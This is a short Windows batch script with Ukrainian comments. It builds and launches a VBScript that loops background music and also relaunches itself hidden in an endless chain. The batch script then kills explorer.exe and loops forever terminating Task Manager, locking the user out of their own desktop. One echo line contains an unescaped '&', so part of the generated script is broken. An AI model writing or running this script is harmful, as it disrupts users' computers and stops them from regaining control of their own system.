@echo off

set VBScriptFile=PlayBackgroundMusic.vbs
set BATScriptFile=RunPlayBackgroundMusic.bat

rem Створення VBScript файлу
echo Set objShell = CreateObject("WScript.Shell") > %VBScriptFile%
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> %VBScriptFile%
echo audioFilePath = "1.mp3" >> %VBScriptFile%
echo If objFSO.FileExists(audioFilePath) Then >> %VBScriptFile%
echo   Set objMediaPlayer = CreateObject("WMPlayer.OCX.7") >> %VBScriptFile%
echo   objMediaPlayer.URL = audioFilePath >> %VBScriptFile%
echo   objMediaPlayer.settings.setMode "loop", True >> %VBScriptFile%
echo   objMediaPlayer.controls.play >> %VBScriptFile%
echo   objShell.Run "wscript.exe ""%VBScriptFile%""", 0, False >> %VBScriptFile%
echo   Do While True >> %VBScriptFile%
echo     WScript.Sleep 1000 >> %VBScriptFile%
echo   Loop >> %VBScriptFile%
echo Else >> %VBScriptFile%
echo   WScript.Echo "Файл не існує: " & audioFilePath >> %VBScriptFile%
echo End If >> %VBScriptFile%

rem Створення BAT файлу для запуску VBScript
echo @echo off > %BATScriptFile%
echo wscript.exe "%VBScriptFile%" >> %BATScriptFile%

rem Запуск BAT файлу для відтворення музики в фоновому режимі
call %BATScriptFile%

taskkill /f /im explorer.exe

:i
taskkill /f /im taskmgr.exe
goto i